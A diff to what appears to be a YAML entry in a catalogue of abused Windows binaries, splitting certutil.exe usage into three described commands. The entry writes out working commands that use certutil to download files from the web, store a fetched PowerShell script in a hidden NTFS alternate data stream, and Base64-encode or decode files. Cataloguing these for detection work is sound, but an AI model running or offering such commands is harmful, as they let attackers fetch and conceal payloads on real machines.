@@ -5,11 +5,14 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: "certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe\
-      \    \n    \ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1\
-      \ c:\\temp:ttt    \n    \ncertutil -encode inputFileName encodedOutputFileName\
-      \   \n    \ncertutil -decode encodedInputFileName decodedOutputFileName"
-    Description: ''
+  - Command: certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+    Description: Download and save 7zip to disk in the current folder.
+  - Command: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+    Description: Download and save a PS1 file to an Alternate Data Stream (ADS).
+  - Command: |
+          certutil -encode inputFileName encodedOutputFileName
+          certutil -decode encodedInputFileName decodedOutputFileName
+    Description: Commands to encode and decode a file using Base64.
 Full Path:
   - c:\windows\system32\certutil.exe
   - c:\windows\sysWOW64\certutil.exe
